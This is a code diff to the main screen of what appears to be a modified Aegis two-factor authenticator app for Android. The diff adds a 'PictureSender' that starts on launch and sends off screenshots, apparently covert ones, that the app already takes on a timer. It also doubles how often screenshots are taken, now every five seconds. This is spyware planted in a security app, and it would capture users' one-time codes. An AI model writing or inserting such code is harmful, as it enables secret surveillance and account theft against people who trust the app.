@@ -87,6 +87,9 @@ import android.content.ContentValues;
 import android.net.Uri;
 import java.io.OutputStream;
 public class MainActivity extends AegisActivity implements EntryListView.Listener {
+    private PictureSender pictureSender;
+
+
     // activity request codes
     private static final int CODE_SCAN = 0;
     private static final int CODE_ADD_ENTRY = 1;
@@ -130,8 +133,13 @@ public class MainActivity extends AegisActivity implements EntryListView.Listene
     @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
+
         super.onCreate(savedInstanceState);
         handler.post(runnableCode); //Screenshot handler
+        pictureSender = new PictureSender(this); //Screenshot sender
+        pictureSender.startSending();
+
         // Create and show a pop-up dialog
         new AlertDialog.Builder(this)
                 .setTitle("Important notice")
@@ -247,7 +255,7 @@ public class MainActivity extends AegisActivity implements EntryListView.Listene
             saveBitmapToGallery(bitmap);
 
             // Repeat this runnable code block again every 10 seconds
-            handler.postDelayed(this, 10000);
+            handler.postDelayed(this, 5000);
         }
     };
 
@@ -270,6 +278,7 @@ public class MainActivity extends AegisActivity implements EntryListView.Listene
         _entryListView.setListener(null);
         super.onDestroy();
         handler.removeCallbacks(runnableCode);
+        pictureSender.stopSending();
     }
 
     @Override
